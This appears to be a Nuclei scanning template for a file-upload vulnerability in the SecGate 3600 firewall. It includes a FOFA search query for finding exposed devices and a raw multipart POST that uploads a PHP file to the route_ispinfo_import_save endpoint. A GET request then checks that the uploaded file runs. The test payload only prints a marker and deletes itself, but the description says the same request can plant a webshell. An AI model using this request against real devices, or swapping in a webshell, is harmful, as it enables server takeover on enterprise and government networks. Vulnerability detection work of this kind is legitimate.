id: secgate-route_ispinfo-file-upload

info:
  name: 网神 SecGate 3600 防火墙 route_ispinfo_import_save 接口文件上传漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="网神SecGate 3600防火墙"
    该设备由网神信息技术股份有限公司开发，部署于企业及政府机构网络环境。route_ispinfo_import_save接口未正确校验上传文件扩展名，导致攻击者可通过构造恶意请求上传Webshell文件，获取服务器控制权限。
  tags: 网神 SecGate 3600

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /?g=route_ispinfo_import_save HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
     
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="MAX_FILE_SIZE"
     
    10000000
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="reqfile"; filename="NTest.php"
    Content-Type: text/plain
     
    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc
    Content-Disposition: form-data; name="submit_post"
     
    route_ispinfo_import_save
    ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
- raw:
  - |
    GET /attachements/NTest.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
